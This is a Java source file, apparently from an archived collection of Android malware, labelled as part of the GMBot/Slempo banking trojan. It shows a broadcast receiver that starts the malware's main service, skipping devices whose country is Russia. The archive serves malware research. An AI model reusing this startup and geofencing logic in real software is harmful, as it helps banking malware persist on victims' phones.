/*
  name      GMBot
  type      android
  cve       —
  year      unknown
  os        Android
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package org.slempo.service;

import org.slempo.service.utils.Utils;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class SDCardServiceStarter extends BroadcastReceiver {

	public static final String ACTION = "com.slempo.baseapp.MainServiceStart";

	@Override
	public void onReceive(Context context, Intent intent) {
		String country = Utils.getCountry(context);
		if (!MainService.isRunning && !country.equalsIgnoreCase("RU")) {
			Intent i = new Intent(ACTION);
			i.setClass(context, MainService.class);
			context.startService(i);
		}
	}/**/
}
